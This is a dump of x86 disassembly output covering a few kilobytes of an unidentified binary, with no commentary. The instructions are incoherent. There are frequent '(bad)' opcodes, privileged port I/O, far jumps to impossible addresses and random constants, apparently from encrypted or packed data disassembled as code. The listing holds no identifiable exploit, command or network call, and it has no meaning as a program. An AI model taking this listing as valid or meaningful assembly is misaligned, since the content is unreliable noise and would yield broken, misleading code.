  417083:	jl     0x417020
  417085:	int3   
  417086:	in     al,dx
  417087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417088:	sub    edi,ebp
  41708a:	pop    ebp
  41708b:	adc    BYTE PTR [ebp+0x77],0x9e
  41708f:	imul   esp,DWORD PTR [esi+0x9],0x73
  417093:	push   ebp
  417094:	nop
  417095:	mov    ebx,0x9a7e3484
  41709a:	loopne 0x417111
  41709c:	jge    0x41711c
  41709e:	mov    al,0xa7
  4170a0:	inc    edx
  4170a1:	icebp  
  4170a2:	inc    esp
  4170a3:	and    eax,0x8be76cd8
  4170a8:	sti    
  4170a9:	jge    0x4170d3
  4170ab:	mov    eax,ds:0x897fac39
  4170b0:	arpl   WORD PTR [edx+ebp*8+0x2c],cx
  4170b4:	fld    st(3)
  4170b6:	inc    ecx
  4170b7:	and    al,BYTE PTR [ecx]
  4170b9:	cmp    bh,dl
  4170bb:	jo     0x417043
  4170bd:	pushf  
  4170be:	and    DWORD PTR [ecx+0x3f],edx
  4170c1:	sar    BYTE PTR [ebx-0x519b9b17],0x17
  4170c8:	jbe    0x4170fa
  4170ca:	out    dx,eax
  4170cb:	loopne 0x41714c
  4170cd:	cmovge eax,eax
  4170d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d1:	or     ah,ch
  4170d3:	cmp    ch,0xa
  4170d6:	push   esp
  4170d7:	fcomp  DWORD PTR [ecx+0x70162e8a]
  4170dd:	push   esp
  4170de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170df:	(bad)  
  4170e0:	es popa 
  4170e2:	out    dx,al
  4170e3:	inc    edx
  4170e4:	sub    dl,BYTE PTR [eax+eiz*1-0x7b04674e]
  4170eb:	aam    0xe9
  4170ed:	lods   eax,DWORD PTR ds:[esi]
  4170ee:	xlat   BYTE PTR ds:[ebx]
  4170ef:	out    0xeb,al
  4170f1:	jb     0x417143
  4170f3:	inc    eax
  4170f4:	sar    BYTE PTR [ebx],cl
  4170f6:	call   0xfc4d:0xd610be3c
  4170fd:	mul    BYTE PTR [edx+0x35]
  417100:	mov    esp,0x724a53dd
  417105:	jns    0x417090
  417107:	pop    ss
  417108:	sub    DWORD PTR [edx+eiz*2-0x5e],esi
  41710c:	cmp    DWORD PTR [edx],esi
  41710e:	push   edx
  41710f:	pop    ebx
  417110:	aas    
  417111:	lods   al,BYTE PTR ds:[esi]
  417112:	inc    ebp
  417113:	repz test BYTE PTR [ebx+0x71],0x2e
  417118:	addr16 inc ebp
  41711a:	jmp    0xb7fa:0xe432244b
  417121:	or     BYTE PTR [eax+0x35700fd1],bh
  417127:	mov    eax,ds:0x84d529a
  41712c:	sti    
  41712d:	mov    BYTE PTR [ecx+0x62],dh
  417130:	pop    eax
  417131:	mov    ds,WORD PTR [esi+0x3b]
  417134:	adc    ebx,DWORD PTR [ebx+0x5e0d53ae]
  41713a:	retf   
  41713b:	mov    BYTE PTR [ebp+0x10b61d82],dl
  417141:	inc    esp
  417142:	aam    0xa7
  417144:	retf   
  417145:	iret   
  417146:	lods   eax,DWORD PTR ds:[esi]
  417147:	pop    ss
  417148:	jmp    0x98e7a00e
  41714d:	mov    dh,BYTE PTR ds:0x1d6aeeee
  417153:	cmp    ch,ch
  417155:	popa   
  417156:	sub    eax,0xd080ae3
  41715b:	cmp    ah,dh
  41715d:	dec    ebp
  41715e:	adc    eax,0x58f8c677
  417163:	sti    
  417164:	in     eax,dx
  417165:	(bad)  
  417166:	pop    ebp
  417167:	add    ch,BYTE PTR [ebx+0x510212a5]
  41716d:	mov    ch,0xe1
  41716f:	out    dx,al
  417170:	xor    DWORD PTR [esi+0x7b],ecx
  417173:	(bad)  
  417174:	int    0xdb
  417176:	pop    ebp
  417177:	out    dx,al
  417178:	dec    ebx
  417179:	and    esi,DWORD PTR [edi-0x2c]
  41717c:	push   cs
  41717d:	int3   
  41717e:	and    ecx,edx
  417180:	mov    dl,0xfa
  417182:	mov    esp,0xede8738a
  417187:	push   ebp
  417188:	ins    BYTE PTR es:[edi],dx
  417189:	jp     0x41718d
  41718b:	cmp    BYTE PTR [ebp+0x3df9e202],bh
  417191:	ret    0x6864
  417194:	pop    eax
  417195:	and    BYTE PTR es:[ecx],0x16
  417199:	iret   
  41719a:	fucomip st,st(4)
  41719c:	adc    DWORD PTR [eax+0xb99ccd2],esp
  4171a2:	into   
  4171a3:	std    
  4171a4:	icebp  
  4171a5:	and    eax,0x172b6ff2
  4171aa:	lds    edx,FWORD PTR [esp+ebp*8-0x33]
  4171ae:	jns    0x41719d
  4171b0:	shl    BYTE PTR [ebp-0x257d0904],cl
  4171b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171b7:	sbb    bh,ah
  4171b9:	pop    esi
  4171ba:	dec    ebx
  4171bb:	dec    esi
  4171bc:	lock push edx
  4171be:	inc    ebx
  4171bf:	jne    0x4171fd
  4171c1:	repnz and ebp,edi
  4171c4:	add    BYTE PTR [esi],0x40
  4171c7:	(bad)  
  4171c8:	dec    ecx
  4171c9:	mov    al,ds:0x6124e2c6
  4171ce:	in     al,dx
  4171cf:	mov    WORD PTR [eax-0x3119aa06],fs
  4171d5:	inc    edx
  4171d6:	adc    BYTE PTR [edx-0x7c],al
  4171d9:	sub    eax,DWORD PTR [ecx]
  4171db:	pop    esi
  4171dc:	fistp  DWORD PTR [esi-0x17]
  4171df:	inc    esp
  4171e0:	aaa    
  4171e1:	fstp   TBYTE PTR [edx]
  4171e3:	inc    esp
  4171e4:	jne    0x417236
  4171e6:	ret    0x3a8f
  4171e9:	outs   dx,BYTE PTR ds:[esi]
  4171ea:	rol    BYTE PTR [edi-0x440d6c37],1
  4171f0:	xchg   edx,eax
  4171f1:	out    dx,eax
  4171f2:	jge    0x4171d7
  4171f4:	or     esp,DWORD PTR [eax+0x3d]
  4171f7:	int3   
  4171f8:	in     al,0x29
  4171fa:	ffreep st(0)
  4171fc:	sbb    eax,DWORD PTR [ebp-0x4a]
  4171ff:	dec    eax
  417200:	imul   ebx,ecx,0xffffff9d
  417203:	adc    ah,BYTE PTR [ebx]
  417205:	and    al,0xb5
  417207:	in     eax,0xbd
  417209:	jl     0x417236
  41720b:	iret   
  41720c:	dec    DWORD PTR [ebx-0x4282c72f]
  417212:	mov    ds:0xa4b630ae,eax
  417217:	dec    edx
  417218:	mov    ds:0x2e9da269,eax
  41721d:	daa    
  41721e:	ja     0x4171af
  417220:	dec    edx
  417221:	and    dl,BYTE PTR [ecx+0x5a90b47b]
  417227:	ja     0x41729d
  417229:	dec    ebp
  41722a:	cmp    al,0x65
  41722c:	ss jg  0x41728d
  41722f:	into   
  417230:	sub    eax,0x1fd8b3cc
  417235:	sub    edx,edi
  417237:	or     ch,BYTE PTR [ecx-0x40]
  41723a:	mov    eax,ds:0x434ab200
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	xchg   ebp,eax
  417255:	xor    bh,BYTE PTR [ebx+0x7f26708b]
  41725b:	jo     0x417216
  41725d:	jle    0x4172cf
  41725f:	jo     0x417296
  417261:	call   FWORD PTR [ebp-0x3f]
  417264:	cld    
  417265:	inc    ebp
  417266:	and    al,0x0
  417268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41726a:	mov    edx,0x120a3f21
  41726f:	sub    DWORD PTR [ebx*1-0x62942e1c],0x7c4cee5e
  41727a:	outs   dx,DWORD PTR ds:[esi]
  41727b:	sbb    esi,DWORD PTR [ecx-0x5e]
  41727e:	(bad)  
  41727f:	mov    bl,0x14
  417281:	xor    eax,0x3b582f8a
  417286:	jmp    0x7f44:0x78e9d943
  41728d:	enter  0xd080,0x53
  417291:	jecxz  0x417245
  417293:	dec    esp
  417294:	xchg   ecx,eax
  417295:	icebp  
  417296:	rol    cl,0x51
  417299:	dec    esi
  41729a:	adc    DWORD PTR [ebx],edi
  41729c:	mov    ebx,0x888e91fe
  4172a1:	or     dl,bl
  4172a3:	scas   al,BYTE PTR es:[edi]
  4172a4:	push   ss
  4172a5:	(bad)  
  4172a6:	mov    ah,0x92
  4172a8:	shl    ebp,1
  4172aa:	scas   eax,DWORD PTR es:[edi]
  4172ab:	mov    edx,0xe2b8aaa2
  4172b0:	jmp    0x6da15480
  4172b5:	pop    ebp
  4172b6:	stos   DWORD PTR es:[edi],eax
  4172b7:	sub    eax,0x6ca9c7de
  4172bc:	mov    ds:0x8343a9ee,eax
  4172c1:	test   dl,al
  4172c3:	xchg   ebx,eax
  4172c4:	gs xchg BYTE PTR gs:[edi-0x36cd416b],bl
  4172cc:	push   ds
  4172cd:	mov    ecx,eax
  4172cf:	fidiv  WORD PTR [edi]
  4172d1:	add    dh,BYTE PTR [ebp-0x4063c27e]
  4172d7:	or     BYTE PTR [eax+0x24],0xef
  4172db:	push   ss
  4172dc:	cmp    al,0xce
  4172de:	ja     0x41729a
  4172e0:	inc    eax
  4172e1:	push   eax
  4172e2:	inc    esi
  4172e3:	js     0x417300
  4172e5:	jae    0x417331
  4172e7:	inc    edi
  4172e8:	pop    ecx
  4172e9:	inc    eax
  4172ea:	dec    ebx
  4172eb:	ds es adc ah,bh
  4172ef:	push   esi
  4172f0:	adc    eax,0x7482a1b1
  4172f5:	sbb    al,0xa7
  4172f7:	nop
  4172f8:	test   eax,0x43782514
  4172fd:	mov    bh,0x7e
  4172ff:	retf   0x95b7
  417302:	out    dx,eax
  417303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417304:	xchg   ecx,eax
  417305:	push   ecx
  417306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417307:	inc    esp
  417308:	mov    bh,ch
  41730a:	add    bl,bl
  41730c:	cmc    
  41730d:	xchg   esp,eax
  41730e:	cdq    
  41730f:	inc    esp
  417310:	mov    ch,0xc2
  417312:	packuswb mm5,QWORD PTR [ebx-0x575f9789]
  417319:	add    eax,esi
  41731b:	cmp    dh,ch
  41731d:	pop    ss
  41731e:	xor    eax,DWORD PTR [edi+0x39]
  417321:	cs lahf 
  417323:	scas   eax,DWORD PTR es:[edi]
  417324:	push   0xfffffff8
  417326:	push   edi
  417327:	aaa    
  417328:	sub    DWORD PTR [ebx+0x3a5c2b3a],edi
  41732e:	jb     0x4172c2
  417330:	gs xchg esp,eax
  417332:	retf   0x7554
  417335:	inc    ebx
  417336:	inc    ebp
  417337:	out    dx,al
  417338:	ss or  bh,dh
  41733b:	mov    edx,0x82a3bfbc
  417340:	jns    0x417337
  417342:	test   BYTE PTR [ebx-0x49],ch
  417345:	dec    ebp
  417346:	fdivp  st(4),st
  417348:	xchg   esi,eax
  417349:	xchg   ebx,eax
  41734a:	jl     0x417369
  41734c:	add    DWORD PTR es:[ebx+eiz*8-0xf],edx
  417351:	add    eax,0x7570a284
  417356:	popa   
  417357:	cmp    DWORD PTR [ebx+0x277595e5],ebx
  41735d:	adc    BYTE PTR [edi+ecx*1+0x31],dh
  417361:	std    
  417362:	xor    DWORD PTR [ecx],edx
  417364:	jo     0x4173a5
  417366:	cmp    DWORD PTR [ebp+0x32],ebp
  417369:	add    al,0x79
  41736b:	mov    edx,edx
  41736d:	sub    edi,DWORD PTR [ebp-0x53]
  417370:	ins    DWORD PTR es:[edi],dx
  417371:	(bad)  
  417372:	cmp    BYTE PTR [ebp+eiz*2+0x13],ah
  417376:	hlt    
  417377:	jb     0x417377
  417379:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41737b:	nop
  41737c:	test   BYTE PTR [ebx],cl
  41737e:	imul   ebx,DWORD PTR [ebx-0x364e0f49],0x4b44e404
  417388:	retf   
  417389:	cdq    
  41738a:	loope  0x417389
  41738c:	sub    eax,0x25fe3f24
  417391:	and    al,BYTE PTR ds:0x6897c770
  417397:	xor    eax,0x83aacd7e
  41739c:	popa   
  41739d:	scas   eax,DWORD PTR es:[edi]
  41739e:	xor    eax,DWORD PTR [edx+0x6]
  4173a1:	mov    ebp,0xe5d1a443
  4173a6:	xchg   esi,eax
  4173a7:	inc    ecx
  4173a8:	or     bl,BYTE PTR [ebx-0x7]
  4173ab:	stos   DWORD PTR es:[edi],eax
  4173ac:	pop    edx
  4173ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ae:	fsub   DWORD PTR [ebx]
  4173b0:	stos   BYTE PTR es:[edi],al
  4173b1:	retf   
  4173b2:	jge    0x4173bd
  4173b4:	imul   esp,esp,0x726f2482
  4173ba:	icebp  
  4173bb:	xor    ebp,ebx
  4173bd:	leave  
  4173be:	or     dl,dh
  4173c0:	mov    edx,ss
  4173c2:	bound  edi,QWORD PTR [ecx+0x7f1d3e98]
  4173c8:	xchg   edi,eax
  4173c9:	mov    ds:0x6aa76922,al
  4173ce:	pop    ecx
  4173cf:	arpl   cx,di
  4173d1:	aas    
  4173d2:	iret   
  4173d3:	loop   0x4173d6
  4173d5:	push   cs
  4173d6:	les    esi,FWORD PTR [ecx]
  4173d8:	push   ebp
  4173d9:	jge    0x417445
  4173db:	mov    edx,0x30caaf50
  4173e0:	lahf   
  4173e1:	mov    esi,0x6343607
  4173e6:	lea    eax,[edi]
  4173e8:	sar    DWORD PTR [ebx+0x1c24b218],cl
  4173ee:	repnz xchg edx,eax
  4173f0:	ret    0x18fa
  4173f3:	ja     0x41744a
  4173f5:	cmp    al,0xb4
  4173f7:	or     DWORD PTR [ecx+0x63],0x2f
  4173fb:	(bad)  
  4173fd:	mov    al,ds:0xd0b2226b
  417402:	mov    ds:0xa72b7c7f,al
  417407:	cmp    eax,0xbcad81e
  41740c:	loopne 0x41740b
  41740e:	jbe    0x4173f9
  417410:	dec    ebp
  417411:	inc    esp
  417412:	mov    ah,BYTE PTR [esi+0xe36bb75]
  417418:	data16 jp 0x417476
  41741b:	xchg   DWORD PTR [ebp-0x47],ebp
  41741e:	outs   dx,BYTE PTR ds:[esi]
  41741f:	xchg   ebx,eax
  417420:	fs or  al,0xb5
  417423:	push   esi
  417424:	mov    BYTE PTR [ebx],bl
  417426:	inc    esi
  417427:	(bad)  
  417428:	mov    dh,0xa5
  41742a:	nop
  41742b:	add    cl,ch
  41742d:	(bad)  [edx]
  41742f:	inc    ecx
  417430:	arpl   WORD PTR [esi],bp
  417432:	dec    edi
  417433:	iret   
  417434:	xchg   ebx,eax
  417435:	dec    edx
  417436:	cs pop edi
  417438:	jnp    0x4173f5
  41743a:	adc    bh,al
  41743c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41743d:	scas   al,BYTE PTR es:[edi]
  41743e:	(bad)  
  41743f:	into   
  417440:	shl    dl,0xa7
  417443:	pop    esi
  417444:	sbb    BYTE PTR [ebx-0x5717bd0e],bl
  41744a:	in     eax,dx
  41744b:	and    BYTE PTR ds:0x51275444,cl
  417451:	and    ch,BYTE PTR ds:0xe352b194
  417457:	dec    esp
  417458:	retf   
  417459:	sbb    dh,BYTE PTR [edi+0x34909ed]
  41745f:	pop    ecx
  417460:	inc    edx
  417461:	mov    ebp,0x3cf609f
  417466:	dec    edi
  417467:	push   ds
  417468:	sub    DWORD PTR [ecx],esi
  41746a:	call   0xe66191b5
  41746f:	xchg   esp,eax
  417470:	mov    DWORD PTR [ebp-0x55db3e62],0x62e5084e
  41747a:	mov    ah,0x25
  41747c:	mov    dh,al
  41747e:	sub    DWORD PTR [ecx-0x3e],esp
  417481:	dec    edx
  417482:	loope  0x41744b
  417484:	adc    ah,BYTE PTR [eax-0x1eb5fdc5]
  41748a:	adc    al,BYTE PTR [eax]
  41748c:	pusha  
  41748d:	jecxz  0x4174c8
  41748f:	sub    bh,BYTE PTR [edx-0x5e51d12b]
  417495:	cld    
  417496:	in     al,0x1
  417498:	imul   ebx,DWORD PTR [edx],0xd7186e5a
  41749e:	pop    ecx
  41749f:	pop    eax
  4174a0:	add    BYTE PTR [edx+ebx*8-0x6b079021],cl
  4174a7:	jecxz  0x41744d
  4174a9:	inc    edx
  4174aa:	and    al,ch
  4174ac:	into   
  4174ad:	inc    ebx
  4174ae:	lds    ebx,FWORD PTR [ebx-0x344e37db]
  4174b4:	rcr    ah,0xce
  4174b7:	sbb    DWORD PTR [ebx+0x36d962c4],esi
  4174bd:	mov    cl,0xb1
  4174bf:	lds    ebp,FWORD PTR ds:0xfa048bf1
  4174c5:	sbb    al,0x3c
  4174c7:	hlt    
  4174c8:	(bad)  
  4174c9:	adc    edx,ebp
  4174cb:	cmp    eax,0x21363ca0
  4174d0:	fadd   DWORD PTR [edi]
  4174d2:	or     BYTE PTR [esi-0x37],ch
  4174d5:	add    dh,BYTE PTR [ebp+0x478fe417]
  4174db:	sbb    BYTE PTR [esp+edx*4+0x1d228c1a],dl
  4174e2:	stc    
  4174e3:	xchg   ebp,eax
  4174e4:	popa   
  4174e5:	mov    ds:0x2929352b,al
  4174ea:	adc    DWORD PTR [eax],ebp
  4174ec:	aas    
  4174ed:	push   eax
  4174ee:	adc    BYTE PTR [ebx-0x7881a977],bl
  4174f4:	jg     0x4174be
  4174f6:	sbb    DWORD PTR [edx],ecx
  4174f8:	rcl    BYTE PTR [ebx-0x55],1
  4174fb:	push   0xf20783b
  417500:	daa    
  417501:	inc    edi
  417502:	jg     0x417492
  417504:	mov    bl,0xb1
  417506:	push   0x93034e78
  41750b:	sar    DWORD PTR [ebp-0x513d9e14],cl
  417511:	call   0xdd1994f5
  417516:	out    0x52,eax
  417518:	push   ebp
  417519:	jno    0x41756a
  41751b:	in     eax,0x57
  41751d:	out    0xc4,eax
  41751f:	mov    ah,dh
  417521:	add    eax,0x18a776f7
  417526:	or     dh,BYTE PTR [ebx]
  417528:	rol    BYTE PTR [ecx],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    ebp,ebx
  417543:	test   ebp,edi
  417545:	call   0x7eb9:0x707f24b9
  41754c:	jo     0x4175be
  41754e:	in     al,0xe1
  417550:	test   BYTE PTR [ebx],dl
  417552:	(bad)  
  417553:	sub    ebp,DWORD PTR [edi]
  417555:	jmp    0x397d:0x24b5eeda
  41755c:	xchg   ecx,eax
  41755d:	in     eax,dx
  41755e:	mov    esi,0xc5e1a4bd
  417563:	das    
  417564:	mov    cl,0x31
  417566:	push   esi
  417567:	pushf  
  417568:	bnd jae 0x417539
  41756b:	mov    edi,0xdab433cc
  417570:	inc    esp
  417571:	div    BYTE PTR [esi+0x44b652af]
  417577:	jp     0x417575
  417579:	and    dx,WORD PTR [edi-0x1e]
  41757d:	add    esi,DWORD PTR [edx-0x42]
  417580:	mov    dl,0x6f
  417582:	sub    eax,0x6a69a1af
  417587:	stc    
  417588:	or     bh,cl
  41758a:	mov    BYTE PTR [edi+0x11],dl
  41758d:	mov    edx,0xb82f478a
  417592:	call   0x2840dc7d
  417597:	push   edx
  417598:	rol    BYTE PTR [eax+0x5c],0xeb
  41759c:	xor    BYTE PTR [edx-0x50b5f764],bh
  4175a2:	or     al,al
  4175a4:	in     eax,0x36
  4175a6:	jns    0x4175b8
  4175a8:	jb     0x4175fb
  4175aa:	xchg   DWORD PTR [ecx+0x5a],esi
  4175ad:	das    
  4175ae:	iret   
  4175af:	pop    ss
  4175b0:	cmp    eax,0x618dda86
  4175b5:	cwde   
  4175b6:	enter  0xd259,0x45
  4175ba:	ins    BYTE PTR es:[edi],dx
  4175bb:	arpl   WORD PTR [ebp-0x22],si
  4175be:	js     0x417612
  4175c0:	popa   
  4175c1:	pop    ds
  4175c2:	daa    
  4175c3:	mov    ebx,0xdb5cbc36
  4175c8:	lds    eax,FWORD PTR [edx]
  4175ca:	fld    DWORD PTR [eax-0x20075d67]
  4175d0:	sub    al,0x3
  4175d2:	dec    esp
  4175d3:	adc    al,0xc8
  4175d5:	sub    DWORD PTR [ebx+0x10],ebp
  4175d8:	dec    eax
  4175d9:	bound  ecx,QWORD PTR [ebp+0xe]
  4175dc:	mov    eax,ds:0x8fd7be0c
  4175e1:	fwait
  4175e2:	ja     0x417661
  4175e4:	or     BYTE PTR [ebp+0x6a8e2c67],ah
  4175ea:	test   bh,cl
  4175ec:	inc    esp
  4175ed:	nop
  4175ee:	lds    ebp,FWORD PTR [edi-0x743f61a1]
  4175f4:	rcl    dh,1
  4175f6:	nop
  4175f7:	sti    
  4175f8:	mov    esp,0x94a133ea
  4175fd:	cmp    bh,BYTE PTR [ecx+0x6a]
  417600:	pop    ss
  417601:	int    0x6c
  417603:	outs   dx,DWORD PTR ds:[esi]
  417604:	push   edx
  417605:	pop    es
  417606:	cmp    BYTE PTR [ebp-0x3531b45c],0x95
  41760d:	mov    ch,0x96
  41760f:	jb     0x417650
  417611:	cmp    BYTE PTR [ebx-0x2c],cl
  417614:	ja     0x4175ab
  417616:	retf   0x86bb
  417619:	pop    es
  41761a:	xchg   edi,eax
  41761b:	add    al,0xd2
  41761d:	inc    esi
  41761e:	(bad)  
  41761f:	out    0x5f,al
  417621:	dec    esi
  417622:	adc    ah,dl
  417624:	outs   dx,DWORD PTR ds:[esi]
  417625:	(bad)
  417628:	neg    ebp
  41762a:	punpckhwd mm1,QWORD PTR cs:[edi-0x27]
  41762f:	repz adc eax,0x6e1ee7f5
  417635:	push   ecx
  417636:	jg     0x4176b0
  417638:	pop    ebx
  417639:	mov    dh,0xb7
  41763b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41763c:	ret    0x7851
  41763f:	pop    edi
  417640:	fidivr DWORD PTR [ecx-0x33144156]
  417646:	in     eax,0xee
  417648:	mov    esi,0x3f6d184a
  41764d:	mov    esi,0xc79d0f9f
  417652:	retf   
  417653:	jo     0x41767a
  417655:	repnz mov cl,0x77
  417658:	pop    edi
  417659:	xor    dh,BYTE PTR [esi]
  41765b:	out    dx,al
  41765c:	jl     0x41761f
  41765e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41765f:	and    al,0x25
  417661:	inc    esp
  417662:	rcl    DWORD PTR [edx],cl
  417664:	and    DWORD PTR [edi-0x20],eax
  417667:	cwde   
  417668:	sub    eax,0x89205548
  41766d:	mov    dl,dh
  41766f:	add    edx,esi
  417671:	je     0x417608
  417673:	std    
  417674:	and    cl,0xd0
  417677:	repz pop ebx
  417679:	ret    
  41767a:	mov    edx,0xc7375487
  41767f:	test   esi,ebx
  417681:	daa    
  417682:	push   ebx
  417683:	(bad)  
  417685:	cmp    eax,0x616e20f
  41768a:	mov    ebp,0x81c6e606
  41768f:	or     DWORD PTR [ebp+0x40],0xcc3cab67
  417696:	fwait
  417697:	sti    
  417698:	das    
  417699:	dec    edx
  41769a:	or     al,0xe2
  41769c:	cld    
  41769d:	mov    bl,0x83
  41769f:	adc    BYTE PTR [ebx+ecx*2+0x2bd69076],dh
  4176a6:	stc    
  4176a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176a8:	mov    al,0x73
  4176aa:	adc    edi,ecx
  4176ac:	pop    eax
  4176ad:	dec    esi
  4176ae:	xor    al,0xae
  4176b0:	mov    ebp,0x1e9dd5bb
  4176b5:	pushf  
  4176b6:	ss push ebx
  4176b8:	popa   
  4176b9:	inc    ecx
  4176ba:	pop    esi
  4176bb:	add    cl,BYTE PTR [ebx-0x6d]
  4176be:	imul   esi,DWORD PTR [ebx],0x5f
  4176c1:	imul   edx,eax,0x16e4f2c3
  4176c7:	xchg   esi,eax
  4176c8:	push   es
  4176c9:	inc    ebp
  4176ca:	and    BYTE PTR [ecx],ch
  4176cc:	mov    dl,0xc7
  4176ce:	scas   al,BYTE PTR es:[edi]
  4176cf:	push   edx
  4176d0:	mov    esp,0x1db802dc
  4176d5:	fisttp QWORD PTR [ebp+0x4c10ef9d]
  4176db:	dec    eax
  4176dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176dd:	jmp    0x41769f
  4176df:	xor    DWORD PTR [ecx],ebp
  4176e1:	inc    ecx
  4176e2:	cmp    eax,0x1b0d84a9
  4176e7:	xchg   ebx,edx
  4176e9:	shr    DWORD PTR [ebx+0x3729679b],cl
  4176ef:	aaa    
  4176f0:	mov    ds:0x39a77940,al
  4176f5:	outs   dx,BYTE PTR ds:[esi]
  4176f6:	pop    ecx
  4176f7:	fdivr  DWORD PTR [edx]
  4176f9:	mov    bh,0x26
  4176fb:	pop    edi
  4176fc:	dec    ebp
  4176fd:	out    dx,al
  4176fe:	rep stos BYTE PTR es:[edi],al
  417700:	add    ebp,DWORD PTR [ebp+0x74]
  417703:	into   
  417704:	or     esi,DWORD PTR [edi+ebp*4-0x4b3a24a7]
  41770b:	retf   0x4d17
  41770e:	and    eax,0x77404516
  417713:	sub    DWORD PTR [ecx-0x5c],ebx
  417716:	xchg   edx,eax
  417717:	retf   
  417718:	pop    ecx
  417719:	jb     0x4176e4
  41771b:	sub    DWORD PTR [edi-0x11],esp
  41771e:	adc    ebx,DWORD PTR [ecx+eax*4-0x2b]
  417722:	daa    
  417723:	xor    BYTE PTR [ebx],0x36
  417726:	scas   al,BYTE PTR es:[edi]
  417727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417728:	out    dx,al
  417729:	ret    0x6ec7
  41772c:	loope  0x4176db
  41772e:	int    0x79
  417730:	sti    
  417731:	inc    ebp
  417732:	cdq    
  417733:	outs   dx,BYTE PTR ds:[esi]
  417734:	sub    BYTE PTR [ebp+0x4df0e343],ch
  41773a:	mov    al,ds:0xf29e3f7e
  41773f:	fcom   DWORD PTR [esi+0x56b2a03c]
  417745:	pop    esp
  417746:	xchg   edx,eax
  417747:	adc    eax,esi
  417749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41774a:	add    DWORD PTR [ebp+0x45],ebp
  41774d:	shr    BYTE PTR [ebx],1
  41774f:	pop    ss
  417750:	sar    DWORD PTR [edx],cl
  417752:	pop    edx
  417753:	das    
  417754:	cmp    ch,BYTE PTR [ebx+0x4fcbb8f1]
  41775a:	sbb    dl,BYTE PTR [ebp-0x18]
  41775d:	lahf   
  41775e:	xchg   ecx,eax
  41775f:	cwde   
  417760:	sub    al,0xce
  417762:	cmp    cl,BYTE PTR [ebp+0x19]
  417765:	adc    eax,0x499c4e27
  41776a:	jp     0x4177ad
  41776c:	mov    ds:0xbd13cc4,eax
  417771:	iret   
  417772:	or     al,0x56
  417774:	into   
  417775:	fld    DWORD PTR [edx+0x73]
  417778:	mov    ds:0x1ac59738,al
  41777d:	xor    esi,esi
  41777f:	in     al,dx
  417780:	push   ebp
  417781:	lea    ebx,[ecx+0x24]
  417784:	(bad)  
  417786:	push   edx
  417787:	fs sbb ebx,edi
  41778a:	jecxz  0x4177b3
  41778c:	push   es
  41778d:	aam    0x7
  41778f:	cmp    ecx,ebx
  417791:	jl     0x4177bc
  417793:	daa    
  417794:	mov    cr3,esi
  417797:	stos   DWORD PTR es:[edi],eax
  417798:	sbb    DWORD PTR [edx],esp
  41779a:	jbe    0x41772c
  41779c:	lock or eax,0xc7d7d92c
  4177a2:	fsubr  DWORD PTR [ebx]
  4177a4:	test   eax,0xc6c8fa36
  4177a9:	sbb    al,0x89
  4177ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177ac:	scas   al,BYTE PTR es:[edi]
  4177ad:	aas    
  4177ae:	repz retf 0x4e1c
  4177b2:	pop    esi
  4177b3:	cld    
  4177b4:	mov    ebx,0x78a0c02d
  4177b9:	xchg   ebp,eax
  4177ba:	(bad)  
  4177bb:	pushf  
  4177bc:	xchg   ebp,eax
  4177bd:	repnz std 
  4177bf:	pop    edx
  4177c0:	xchg   ecx,eax
  4177c1:	ins    DWORD PTR es:[edi],dx
  4177c2:	jo     0x417822
  4177c4:	and    al,0xd8
  4177c6:	outs   dx,BYTE PTR ds:[esi]
  4177c7:	xor    DWORD PTR [ecx],esi
  4177c9:	les    esp,FWORD PTR [ebx]
  4177cb:	push   esp
  4177cc:	out    0xe1,eax
  4177ce:	iret   
  4177cf:	add    DWORD PTR es:[eax+0x62],ecx
  4177d3:	sub    bl,BYTE PTR [esi+0x32c9ba9f]
  4177d9:	jge    0x4177cc
  4177db:	mov    al,ds:0xe6bbcb5e
  4177e0:	push   0x15286bb1
  4177e5:	pop    edi
  4177e6:	mov    esi,0x1dab3cee
  4177eb:	and    DWORD PTR [esi-0x45af5c6a],esi
  4177f1:	shr    ebx,0xf4
  4177f4:	add    ecx,esp
  4177f6:	mov    ds:0x4b91abe3,al
  4177fb:	int    0xfa
  4177fd:	aam    0x41
  4177ff:	pusha  
  417800:	gs jno 0x4177b0
  417803:	fsub   QWORD PTR [ebx+eax*2+0x6fe0f040]
  41780a:	pop    eax
  41780b:	cmc    
  41780c:	mov    bl,0x56
  41780e:	mov    edi,DWORD PTR [edx+0xa76da1c]
  417814:	in     al,0x5e
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
